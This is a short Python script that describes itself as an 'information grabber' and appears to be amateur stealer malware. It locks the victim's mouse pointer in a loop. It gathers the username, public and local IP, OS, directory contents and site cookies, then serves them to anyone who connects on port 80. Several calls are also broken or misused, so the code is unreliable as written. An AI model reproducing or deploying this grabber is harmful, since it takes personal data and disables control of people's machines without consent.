# poorly coded computer information grabber
# but it works

from os import getlogin, getlogin, system
from mouse import move, get_position
import socket
from sys import platform, api_version, getprofile
from os import getlogin, listdir
from time import sleep
from threading import Thread
from requests import get


# FARVER #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"
# END OF FARVER

the_host = socket.gethostbyname(socket.gethostname())
HOST = ""
HOST += the_host

PORT = 80
BUFFER = 1024*3

address = (HOST,PORT)



def lock_mouse():
    try:
        pos = (0, 0) # the position the mouse will be locked in
        move(pos[0], pos[1])
        while True:
            if get_position() != pos:
                move(pos[0], pos[1])
                sleep(0.01)
    except:
        print(f"[!] couldnt get access to mouse!")



def listen_for_host(address):
    print(f"[+] Getting information...")
    get_os_info("https://example.com") # the website to get the cookie from
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(address)
    except:
        print(F"[!] couldnt bind to {address[0]}:{address[1]} are you sure its the right ip?")
    print(f"[+] Listening for host on {HOST}...")
    sock.listen(5)
    conn, ip = sock.accept()
    print(f"[+] Connection recived...")
    msg =   f"\
            user: {info_list[0]}\n\
            public ip: {info_list[1]}\n\
            local ip: {info_list[2]}\n\
            operating system: {info_list[3]}\n\
            directory contents: {info_list[4]}\n\
            profiles: {info_list[5]}\n\
            api version: {info_list[6]}\n\
            coockie: {info_list[7]}\n"
    conn.send(f"\n{msg}\n".encode())
    conn.close()
    system("exit")
    exit(1)

def get_os_info(website_to_get_cookie):
    global info_list
    info_list = []

    user = getlogin()
    public_ip = get('https://api.ipify.org').text
    local_ip = socket.gethostbyname(socket.gethostname())
    operating_system = platform
    dir_content = listdir()
    profiles = getprofile()
    api = api_version
    coockie = get(website_to_get_cookie).cookies

    all = user, public_ip, local_ip, operating_system, dir_content, profiles, api, coockie

    for bit_of_info in all:
        info_list.append(bit_of_info)

print("[*] locking mouse position...")
sleep(0.5)
lock_mouse_pos = Thread(target=lock_mouse).start()
listener = Thread(target=listen_for_host(address)).start()
